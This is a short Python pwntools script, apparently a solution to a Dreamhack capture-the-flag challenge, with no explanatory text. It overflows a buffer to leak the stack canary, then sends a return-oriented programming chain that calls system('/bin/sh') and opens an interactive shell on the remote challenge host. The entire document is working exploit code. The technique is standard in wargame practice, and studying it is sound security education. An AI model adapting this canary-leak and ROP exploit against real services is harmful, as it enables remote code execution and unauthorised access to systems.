#!/usr/bin/env python3
from pwn import *
p = remote("host3.dreamhack.games", 20120)
pop_rdi = 0x0000000000400853
binsh = 0x600874
sysplt = 0x00000000004005d0
ret = 0x0000000000400596
p.recvuntil(b"Buf: ")
p.send(b"A"*57)
p.recvuntil(b"A"*57)
canary = u64(b'\x00' + p.recv(7))
print(f"canary: {hex(canary)}")
payload = b'A'*56 + p64(canary)*2 + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(sysplt)
p.sendafter(b"Buf: ", payload)
p.interactive()